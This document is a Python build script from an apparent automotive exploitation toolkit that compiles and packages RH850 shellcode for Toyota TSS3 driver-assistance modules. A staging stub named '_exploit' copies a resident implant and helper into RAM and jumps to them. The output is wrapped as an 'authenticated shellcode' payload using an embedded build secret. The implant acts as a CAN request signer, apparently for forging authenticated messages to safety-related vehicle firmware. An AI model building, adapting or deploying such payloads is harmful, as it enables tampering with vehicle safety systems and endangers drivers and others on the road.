#!/usr/bin/env python3
"""Resolve a TSS3 CodeFlash contract and build the universal 0x08A request signer."""
from __future__ import annotations

import argparse
import json
import re
import shutil
import struct
import subprocess
import tempfile
from pathlib import Path
from typing import Any

from exploit.common.payload_package import package_shellcode
from exploit.common.ram_exec import TOYOTA_P1ME_PAYLOAD_BUILD_SECRET
from exploit.common.rh850_build import (
    CJob,
    compile_asm,
    compile_c_batch,
    jarl_targets,
    nm_symbol,
    sha_bytes,
    validate_toolchain,
)
from exploit.ram_runtime.target_profiles import (
    BOOT_F181_HEX,
    registered_specs,
    spec_from_codeflash,
    supported_targets,
)
from exploit.ram_runtime.tss3_request_signer_contract import (
    HELPER_CODE_LIMIT,
    HELPER_TRANSIT_BASE,
    STATE_SIZE,
)
from tools.targets.tss3.console import render_build

from tools import REPO_ROOT as REPO
BUILDER = Path(__file__).resolve()
SCHEMA = "tss3-request-signer-build-v1"
DEFAULT_CODEC = "four-frame"
COMPACT_CODEC = "compact"
CODECS: dict[str, dict[str, Any]] = {
    DEFAULT_CODEC: {
        "carrier": "functional-nibble4", "frame_count": 4,
        "helper_macros": {}, "experimental": False,
    },
    COMPACT_CODEC: {
        "carrier": "functional-compact1", "frame_count": 1,
        "helper_macros": {"ORACLE_COMPACT_CODEC": 1}, "experimental": True,
    },
}

RESIDENT_SOURCE = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer_resident.c"
RESIDENT_ENTRY_SOURCE = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer_resident.S"
HELPER_SOURCE = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer_helper.c"
ABI_HEADER = REPO / "exploit/ram_runtime/request_signer/tss3_request_signer.h"
STATE_MAGIC = 0x4C433841  # little-endian "A8CL"
STATE_VERSION = 3
UNIVERSAL_SIGNER_HELPER_CODE_LIMIT = HELPER_CODE_LIMIT
TARGETS = supported_targets()
SPECULATIVE_FETCH_GUARD_SIZE = 48
# Own C frames only; stock firmware callees and interrupts are not included.
RESIDENT_STACK_BUDGET = 0
HELPER_STACK_BUDGET = 24
CACHE_PUBLICATION = bytes.fromhex("1f001c00")  # syncp; synci
CMP_IMMEDIATE_RE = re.compile(
    r"\bcmp\s+(-?(?:0x[0-9a-fA-F]+|[0-9]+))\s*,"
)


def output_stem(target: str, codec: str = DEFAULT_CODEC) -> str:
    suffix = "" if codec == DEFAULT_CODEC else "_compact"
    return f"{target.replace('-', '_')}_request_signer{suffix}"


def default_output_dir(target: str, *, codec: str = DEFAULT_CODEC) -> Path:
    codec_suffix = "" if codec == DEFAULT_CODEC else "-compact"
    return REPO / "build/out/ram-runtime" / target / f"tss3-request-signer{codec_suffix}"


STAGING_BASE = 0xFEBF0000
STAGING_LIMIT = 0xFD0
PROFILE_DATA_OFFSET = 0x180
PROFILE_HEADER_FIXED_BUDGET = 0xC0
PROFILE_SELECTOR_ROW_BUDGET = 0x40

# One runtime config is selected by the staging shell and copied into the end of
# the common retained resident pocket. All addresses before CFG_STATE_BASE are
# recovered from the exact CodeFlash control-flow shape; the rest is the small
# signer/I/O ABI that cannot be replaced by direct peripheral ownership.
CONFIG_FIELDS = (
    "app_context",
    "startup_first",
    "startup_after",
    "startup_final",
    "timing_flag",
    "tick_counter",
    "fg_timing_begin",
    "fg_pre_0",
    "fg_pre_1",
    "fg_pre_2",
    "fg_pre_3",
    "fg_aggregate",
    "fg_post_0",
    "fg_post_1",
    "fg_post_2",
    "fg_timing_end",
    "state_base",
    "scratch_base",
    "ring_base",
    "ring_producer",
    "auth_reset",
    "auth_trip",
    "freshness_encode",
    "command5_sync",
    "lower_can_write",
    "command5_globals",
    "response_handle",
)
CONFIG_OFFSETS = {name: index * 4 for index, name in enumerate(CONFIG_FIELDS)}
CONFIG_SIZE = len(CONFIG_FIELDS) * 4
CONFIG_BASE = 0xFEBFFBFC - CONFIG_SIZE
RESIDENT_CODE_LIMIT = CONFIG_BASE - 0xFEBFF9F0


def align(value: int, boundary: int) -> int:
    return (value + boundary - 1) & ~(boundary - 1)


def profile_data_offset(profiles: list[dict[str, Any]]) -> int:
    header_budget = (
        PROFILE_HEADER_FIXED_BUDGET
        + len(profiles) * PROFILE_SELECTOR_ROW_BUDGET
    )
    return max(PROFILE_DATA_OFFSET, align(header_budget, 0x20))


def _profile_selector_source(profiles: list[dict[str, Any]]) -> str:
    blocks: list[str] = []
    shared_address = (
        profiles[0]["software_id_address"]
        if len({profile["software_id_address"] for profile in profiles}) == 1
        else None
    )
    for index, profile in enumerate(profiles):
        words = struct.unpack("<3I", profile["software_id"].encode("ascii"))
        fail_label = f".L_try_profile_{index + 1}" if index + 1 < len(profiles) else ".L_fail"
        checks = (
            [] if shared_address is not None
            else [f"    mov 0x{profile['software_id_address']:08x}, r6"]
        )
        for offset, word in enumerate(words):
            checks.extend((
                f"    ld.w {offset * 4}[r6], r7",
                f"    mov 0x{word:08x}, r8",
                "    cmp r8, r7",
                f"    bne {fail_label}",
            ))
        checks.extend((
            f"    movhi hi(runtime_profile_{index}), r0, r20",
            f"    movea lo(runtime_profile_{index}), r20, r20",
            "    br .L_profile_selected",
        ))
        if index + 1 < len(profiles):
            checks.append(f"{fail_label}:")
        blocks.append("\n".join(checks))
    return "\n".join(blocks)


def _profile_table_source(profiles: list[dict[str, Any]]) -> str:
    rows = []
    for index, profile in enumerate(profiles):
        values = [*profile["boot_calls"], *(profile["config"][name] for name in CONFIG_FIELDS)]
        rows.append(
            f"    .align 4\nruntime_profile_{index}:\n"
            + "\n".join(f"    .long 0x{value & 0xFFFFFFFF:08x}" for value in values)
        )
    return "\n".join(rows)


def staging_source(
    *,
    resident_offset: int,
    resident_size: int,
    helper_offset: int,
    helper_size: int,
    profiles: list[dict[str, Any]],
) -> str:
    selector = _profile_selector_source(profiles)
    selector_addresses = {profile["software_id_address"] for profile in profiles}
    selector_preamble = (
        f"    mov 0x{next(iter(selector_addresses)):08x}, r6"
        if len(selector_addresses) == 1 else ""
    )
    tables = _profile_table_source(profiles)
    return f'''    .section .text
    .global _exploit
_exploit:
{selector_preamble}
{selector}

.L_profile_selected:
    ld.w 0[r20], r12
    jarl [r12], lp
    ld.w 4[r20], r12
    jarl [r12], lp
    ld.w 8[r20], r12
    jarl [r12], lp
    ld.w 12[r20], r12
    jarl [r12], lp
    ld.w 16[r20], r12
    jarl [r12], lp
    cmp r0, r10
    bne .L_fail

    movhi 0xFEBF, r0, r6
    movea 0x{resident_offset:04X}, r6, r6
    mov 0xFEBFF9F0, r7
    movea {resident_size}, r0, r8
.L_copy_resident:
    ld.b 0[r6], r9
    st.b r9, 0[r7]
    add 1, r6
    add 1, r7
    add -1, r8
    cmp r0, r8
    bne .L_copy_resident
    ld.b -1[r7], r9
    syncp
    synci

    movhi 0xFEBF, r0, r6
    movea 0x{helper_offset:04X}, r6, r6
    mov 0xFEF07C00, r7
    movea {helper_size}, r0, r8
.L_copy_helper:
    ld.b 0[r6], r9
    st.b r9, 0[r7]
    add 1, r6
    add 1, r7
    add -1, r8
    cmp r0, r8
    bne .L_copy_helper
    ld.b -1[r7], r9
    syncp
    synci

    movea 20, r20, r6
    mov 0x{CONFIG_BASE:08x}, r7
    movea {CONFIG_SIZE // 4}, r0, r8
.L_copy_config:
    ld.w 0[r6], r9
    st.w r9, 0[r7]
    add 4, r6
    add 4, r7
    add -1, r8
    cmp r0, r8
    bne .L_copy_config

    .global request_signer_resident_handoff
request_signer_resident_handoff:
    mov 0xFEBFF9F0, r12
    jmp [r12]
.L_fail:
    br .L_fail

    .org 0x{resident_offset:X}
resident_blob:
    .incbin "/out/resident.bin"
    .org 0x{helper_offset:X}
helper_blob:
    .incbin "/out/helper.bin"

{tables}
'''


def need(cond: bool, msg: str) -> None:
    if not cond:
        raise RuntimeError(msg)


def validate_cmp_immediates(source: str, *, label: str) -> None:
    """Reject GNU-as truncation of RH850's signed five-bit compare immediate."""
    for lineno, line in enumerate(source.splitlines(), 1):
        match = CMP_IMMEDIATE_RE.search(line)
        if match is None:
            continue
        value = int(match.group(1), 0)
        need(
            -16 <= value <= 15,
            f"{label} line {lineno} uses out-of-range cmp imm5 {match.group(1)}",
        )




def runtime_config(spec: dict[str, Any]) -> dict[str, int]:
    config = dict(spec["runtime_config"])
    need(tuple(config) == CONFIG_FIELDS, "runtime config field order drift")
    return config


def runtime_profiles(specs: dict[str, dict[str, Any]]) -> list[dict[str, Any]]:
    by_software_id: dict[str, dict[str, Any]] = {}
    for name, spec in specs.items():
        software_id = spec["runtime_software_id"]
        row = {
            "software_id": software_id,
            "software_id_address": spec["runtime_software_id_address"],
            "boot_calls": list(spec["boot_calls"]),
            "config": runtime_config(spec),
            "targets": [name],
        }
        existing = by_software_id.get(software_id)
        if existing is None:
            by_software_id[software_id] = row
        else:
            need(
                existing["software_id_address"] == row["software_id_address"]
                and existing["boot_calls"] == row["boot_calls"]
                and existing["config"] == row["config"],
                f"{software_id} resolves to conflicting runtime profiles",
            )
            existing["targets"].append(name)
    return list(by_software_id.values())


def profile_status(
    candidate: dict[str, Any],
    current_profiles: list[dict[str, Any]],
) -> dict[str, Any]:
    software_id = candidate["runtime_software_id"]
    current = next(
        (profile for profile in current_profiles if profile["software_id"] == software_id),
        None,
    )
    if current is None:
        return {
            "status": "compatible-profile-missing",
            "current_targets": [],
        }
    same = (
        current["software_id_address"] == candidate["runtime_software_id_address"]
        and current["boot_calls"] == candidate["boot_calls"]
        and current["config"] == runtime_config(candidate)
    )
    need(same, f"{software_id} conflicts with the current universal profile")
    return {
        "status": "covered-by-current-build",
        "current_targets": current["targets"],
    }


def config_macros() -> dict[str, int]:
    return {
        "ORACLE_CONFIG_BASE": CONFIG_BASE,
        **{f"CFG_{name.upper()}": offset for name, offset in CONFIG_OFFSETS.items()},
    }


def config_header_source() -> str:
    defines = "\n".join(f"#define {name} 0x{value:X}" for name, value in config_macros().items())
    offsets = "\n".join(
        f'_Static_assert(offsetof(SignerConfig, {name}) == {offset}, "config {name} ABI");'
        for name, offset in CONFIG_OFFSETS.items()
    )
    return (
        defines + "\n#ifndef __ASSEMBLER__\n"
        f'#include "/src/{ABI_HEADER.relative_to(REPO)}"\n'
        + offsets + f'\n_Static_assert(sizeof(SignerConfig) == {CONFIG_SIZE}, "config size ABI");\n'
        "#endif\n"
    )


def build_request_signer(
    *,
    target: str | None = None,
    codeflash: Path | None = None,
    codec: str = DEFAULT_CODEC,
    output_dir: Path | None = None,
    stem: str | None = None,
) -> dict[str, Any]:
    """Resolve one exact CodeFlash contract and emit the universal signer build.

    Returns the build metadata dict. Raises on any identity, ABI, placement,
    relocation, or size failure; partial outputs are never reported as success.
    """
    if target is not None and codeflash is not None:
        raise ValueError("pass exactly one of target or codeflash")
    if codec not in CODECS:
        raise ValueError(f"unsupported request codec: {codec}")
    if stem is not None and re.fullmatch(r"[A-Za-z0-9_.-]+", stem) is None:
        raise ValueError("output stem must be a filename stem without path separators")

    specs = registered_specs()
    current_profiles = runtime_profiles(specs)
    transport_ids = {
        (spec["request"]["request_id"], spec["request"]["response_id"])
        for spec in specs.values()
    }
    need(len(transport_ids) == 1, "registered targets do not share CAN identifiers")
    selected = (
        spec_from_codeflash(codeflash, known_specs=specs)
        if codeflash is not None
        else specs[target if target is not None else TARGETS[0]]
    )
    compatibility = profile_status(selected, current_profiles)
    specs[selected["name"]] = selected
    universal_profiles = runtime_profiles(specs)
    codec_spec = CODECS[codec]
    out = output_dir if output_dir is not None else default_output_dir(selected["name"], codec=codec)
    out.mkdir(parents=True, exist_ok=True)
    file_stem = stem if stem is not None else output_stem(selected["name"], codec)
    profile_path = out / f"{file_stem}_profile.json"
    profile_path.write_text(
        json.dumps(selected["contract"], indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )

    validate_cmp_immediates(
        RESIDENT_ENTRY_SOURCE.read_text(encoding="utf-8"), label=str(RESIDENT_ENTRY_SOURCE),
    )

    with tempfile.TemporaryDirectory(prefix="tss3-request-signer-") as td:
        work = Path(td)
        (work / "signer_config.h").write_text(config_header_source(), encoding="utf-8")
        helper, resident = compile_c_batch(work, (
            CJob(
                sources=(str(HELPER_SOURCE.relative_to(REPO)),),
                stem="helper", vma=HELPER_TRANSIT_BASE, entry="_helper_entry",
                symbols={}, defines=codec_spec["helper_macros"], preinclude="signer_config.h",
                stack_budget=HELPER_STACK_BUDGET,
                # In the four-frame build, hoisting saves four code bytes but
                # adds twelve stack bytes. Keep the original helper footprint.
                extra_cflags=("-fno-move-loop-invariants",),
            ),
            CJob(
                sources=(
                    str(RESIDENT_ENTRY_SOURCE.relative_to(REPO)),
                    str(RESIDENT_SOURCE.relative_to(REPO)),
                ),
                stem="resident", vma=int(selected["resident_base"]), entry="_resident_entry",
                symbols={"_helper_entry": HELPER_TRANSIT_BASE},
                defines={}, preinclude="signer_config.h",
                stack_budget=RESIDENT_STACK_BUDGET,
            ),
        ))
        helper_blob = helper["blob"]; assert isinstance(helper_blob, bytes)
        resident_blob = resident["blob"]; assert isinstance(resident_blob, bytes)
        helper_code_size = len(helper_blob)
        resident_code_size = len(resident_blob)
        need(nm_symbol(str(helper["nm"]), "helper_entry") == HELPER_TRANSIT_BASE,
             "helper entry drift")
        need(not helper["relocations"], "helper retains relocations")
        compact_template = nm_symbol(str(helper["nm"]), "oracle_compact_template")
        need((compact_template is not None) == (codec == COMPACT_CODEC),
             "compact template inclusion does not match the explicitly selected codec")
        need(jarl_targets(str(helper["disasm"])) == [],
             "helper retained a target-specific direct call")
        helper_blob += b"\0" * (-len(helper_blob) % 4)
        helper_blob += b"\0" * SPECULATIVE_FETCH_GUARD_SIZE
        need(len(helper_blob) <= UNIVERSAL_SIGNER_HELPER_CODE_LIMIT,
             f"{codec} helper plus speculative-fetch guard exceeds universal layout: "
             f"{len(helper_blob)} > {UNIVERSAL_SIGNER_HELPER_CODE_LIMIT}")

        need(nm_symbol(str(resident["nm"]), "resident_entry") == selected["resident_base"],
             "resident entry drift")
        resident_tick_wait = nm_symbol(str(resident["nm"]), "resident_tick_wait")
        if resident_tick_wait is None:
            raise RuntimeError("resident tick-wait symbol missing")
        need(not resident["relocations"], "resident retains relocations")
        resident_base = int(selected["resident_base"])
        need(resident_tick_wait >= resident_base + STATE_SIZE,
             "live scheduler overlaps the reclaimed state prefix")
        for symbol in ("resident_state_clear", "resident_forever"):
            address = nm_symbol(str(resident["nm"]), symbol)
            need(address is not None and address >= resident_base + STATE_SIZE,
                 f"{symbol} overlaps the reclaimed state prefix")
        resident_calls = jarl_targets(str(resident["disasm"]))
        need(all(
            target == HELPER_TRANSIT_BASE
            or resident_base + STATE_SIZE <= target < resident_base + resident_code_size
            for target in resident_calls
        ), f"resident retained a target-specific direct call: {resident_calls}")
        resident_blob += b"\0" * SPECULATIVE_FETCH_GUARD_SIZE
        need(len(resident_blob) <= RESIDENT_CODE_LIMIT,
             f"resident plus speculative-fetch guard overlaps runtime config: "
             f"{len(resident_blob)} > {RESIDENT_CODE_LIMIT}")

        resident_offset = profile_data_offset(universal_profiles)
        helper_offset = align(resident_offset + len(resident_blob), 4)
        need(helper_offset + len(helper_blob) <= STAGING_LIMIT, "resident/helper exceed staging budget")
        (work / "resident.bin").write_bytes(resident_blob)
        (work / "helper.bin").write_bytes(helper_blob)
        generated_staging_source = staging_source(
            resident_offset=resident_offset,
            resident_size=len(resident_blob),
            helper_offset=helper_offset,
            helper_size=len(helper_blob),
            profiles=universal_profiles,
        )
        validate_cmp_immediates(generated_staging_source, label="generated staging source")
        (work / "staging.S").write_text(generated_staging_source, encoding="utf-8")
        stage = compile_asm(
            work=work,
            source="staging.S",
            stem="staging",
            vma=STAGING_BASE,
            symbols={},
            source_in_repo=False,
        )
        stage_blob = stage["blob"]; assert isinstance(stage_blob, bytes)
        need(
            stage_blob[:resident_offset].count(CACHE_PUBLICATION) == 2,
            "assembled staging lacks two resident/helper cache-publication sequences",
        )
        resident_handoff = nm_symbol(
            str(stage["nm"]), "request_signer_resident_handoff",
        )
        need(resident_handoff is not None, "staging resident-handoff symbol missing")
        embedded_end = helper_offset + len(helper_blob)
        if len(stage_blob) < embedded_end:
            stage_blob += b"\0" * (embedded_end - len(stage_blob))
        need(len(stage_blob) <= STAGING_LIMIT, "staging exceeds authenticated shellcode budget")
        need(stage_blob[resident_offset:resident_offset + len(resident_blob)] == resident_blob,
             "resident embedding drift")
        need(stage_blob[helper_offset:helper_offset + len(helper_blob)] == helper_blob,
             "helper embedding drift")

        payload = package_shellcode(stage_blob, secret=TOYOTA_P1ME_PAYLOAD_BUILD_SECRET)
        need(len(payload) == 0x1000, "authenticated payload is not exact 4 KiB")
        (out / f"{file_stem}.bin").write_bytes(stage_blob)
        (out / f"{file_stem}_resident.bin").write_bytes(resident_blob)
        (out / f"{file_stem}_helper.bin").write_bytes(helper_blob)
        (out / f"{file_stem}_payload.bin").write_bytes(payload)

        debug_dir = out / f"{file_stem}_debug"
        debug_dir.mkdir(exist_ok=True)
        shutil.copy2(work / "signer_config.h", debug_dir / "signer_config.h")
        debug_units = {}
        for name, compiled in (("resident", resident), ("helper", helper)):
            for path in compiled["files"]:
                shutil.copy2(path, debug_dir / path.name)
            debug_units[name] = {
                "elf": f"{name}.elf",
                "disassembly": f"{name}.disasm",
                "stack_reports": [
                    path.name for path in compiled["files"] if path.suffix == ".su"
                ],
                "compile_command": compiled["compile_command"],
            }

        meta: dict[str, Any] = {
            "schema": SCHEMA,
            "toolchain": validate_toolchain(),
            "debug": {
                "directory": debug_dir.name,
                "units": debug_units,
            },
            "target": {
                "name": selected["name"],
                "application_f181_hex": selected["application_f181_hex"],
                "boot_f181_hex": BOOT_F181_HEX,
            },
            "compatibility": compatibility,
            "request": {
                "bus": selected["request"]["request_bus"],
                "can_id": f"0x{selected['request']['request_id']:08X}",
                "codec": codec,
                "carrier": codec_spec["carrier"],
                "frame_count": codec_spec["frame_count"],
            },
            "response": {
                "bus": selected["request"]["response_bus"],
                "can_id": f"0x{selected['request']['response_id']:08X}",
            },
            "state": {
                "version": STATE_VERSION,
                "base": f"0x{int(selected['contract']['memory']['state_base']):08X}",
                "size": STATE_SIZE,
                "layout": selected["contract"]["memory"]["layout"],
            },
            "resident": {
                "path": f"{file_stem}_resident.bin",
                "base": f"0x{int(selected['resident_base']):08X}",
                "size": len(resident_blob),
                "code_size": resident_code_size,
                "guard_size": SPECULATIVE_FETCH_GUARD_SIZE,
                "sha256": sha_bytes(resident_blob),
                "tick_wait": f"0x{resident_tick_wait:08X}",
                "stack_frames": resident["stack_usage"],
            },
            "helper": {
                "path": f"{file_stem}_helper.bin",
                "base": f"0x{HELPER_TRANSIT_BASE:08X}",
                "size": len(helper_blob),
                "code_size": helper_code_size,
                "guard_size": SPECULATIVE_FETCH_GUARD_SIZE,
                "sha256": sha_bytes(helper_blob),
                "staging_offset": helper_offset,
                "stack_frames": helper["stack_usage"],
            },
            "staging": {
                "path": f"{file_stem}.bin",
                "resident_offset": resident_offset,
                "helper_offset": helper_offset,
                "resident_handoff": f"0x{resident_handoff:08X}",
            },
            "authenticated_payload": {
                "path": f"{file_stem}_payload.bin",
                "sha256": sha_bytes(payload),
            },
        }
        (out / f"{file_stem}.json").write_text(
            json.dumps(meta, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
        return meta


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    source = ap.add_mutually_exclusive_group()
    source.add_argument("--target", choices=TARGETS)
    source.add_argument("--codeflash", type=Path, help="resolve and include one arbitrary CodeFlash dump")
    ap.add_argument(
        "--codec", choices=tuple(CODECS), default=DEFAULT_CODEC,
        help="request codec; four-frame is the universal default and compact is experimental opt-in",
    )
    ap.add_argument("--output-dir", type=Path)
    ap.add_argument("--output-stem")
    ap.add_argument("--json", action="store_true", help="print the full JSON metadata instead of the human summary")
    args = ap.parse_args()
    try:
        meta = build_request_signer(
            target=args.target,
            codeflash=args.codeflash,
            codec=args.codec,
            output_dir=args.output_dir,
            stem=args.output_stem,
        )
    except (OSError, RuntimeError, subprocess.CalledProcessError, UnicodeDecodeError, ValueError) as exc:
        ap.error(str(exc))
    if args.json:
        print(json.dumps(meta, indent=2, sort_keys=True))
    else:
        out = args.output_dir if args.output_dir is not None else default_output_dir(meta["target"]["name"], codec=args.codec)
        print(render_build(meta, str(out)))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
